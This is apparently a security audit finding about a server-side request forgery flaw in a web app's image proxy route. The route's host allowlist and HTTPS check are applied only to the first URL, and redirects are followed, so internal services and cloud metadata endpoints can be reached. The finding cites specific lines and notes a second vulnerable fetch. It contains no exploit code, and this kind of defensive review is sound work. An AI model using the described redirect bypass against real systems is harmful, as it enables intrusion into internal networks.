boundary: Server → internet destination restriction in `src/app/api/proxy-image/route.ts#GET`. The check at route.ts:52-60 bounds only the pre-redirect URL; route.ts:63 passes no `redirect` option, so WHATWG/undici default `redirect: "follow"` (up to 20 hops) is in effect and the final destination is never re-validated. The HTTPS-only rule is bypassed the same way (a 302 to `http://…` is followed).
impact: Server-side request forgery from the deployment host to any host/protocol the redirect chain selects: internal-only HTTP services, cloud metadata endpoints, or loopback/sidecar admin ports that are unreachable from the internet. Response body is returned to the attacker when the redirected target answers with an `image/*` content type (route.ts:72-78, 80-90); otherwise the distinct 502 codes (`proxy_upstream_failed` vs `proxy_upstream_not_image`) plus timing still give a reachability/status oracle for internal ports. Request volume is bounded to 60/min per client IP and state change is limited to GET. Same root cause, second reachable instance inside this unit's scope: `src/lib/avatar/transform.ts:275-282` checks `protocol`/host allowlist on the Replicate output URL, then `transform.ts:289` fetches it without pinning redirects.
evidence: route.ts:13-16 defines `ALLOWED_ORIGINS` as host/pathPrefix pairs and the header comment states the intent "Tightly scoped: only sprite-path images from Pokémon Showdown and PokemonDB". route.ts:44-49 rejects non-`https:` initial URLs. route.ts:52-60 computes `allowed` from `parsed.hostname === o.host && parsed.pathname.startsWith(o.pathPrefix)` on the attacker-supplied URL. route.ts:63 `const response = await fetch(url, { signal: AbortSignal.timeout(10_000) })` — no `redirect` option, and `url` is the raw parameter, not the already-validated `parsed` object, so nothing re-checks the hop that actually produces the response. route.ts:72-78 reads the content type of the *final* response, and route.ts:80 buffers its body — proving the code treats post-redirect responses as normal results. By contrast `src/lib/social/image-fetch.ts:97` and `src/lib/discord/match-card-image.tsx:71` pin `redirect: 'error'`, and `image-fetch.ts:48` compares `parsed.origin` (port included) rather than `hostname`, showing the project knows both the bounce and the port-scope hazards for this exact pattern; `src/lib/avatar/transform.ts:289` is the other allowlisted fetch that omits the pin.
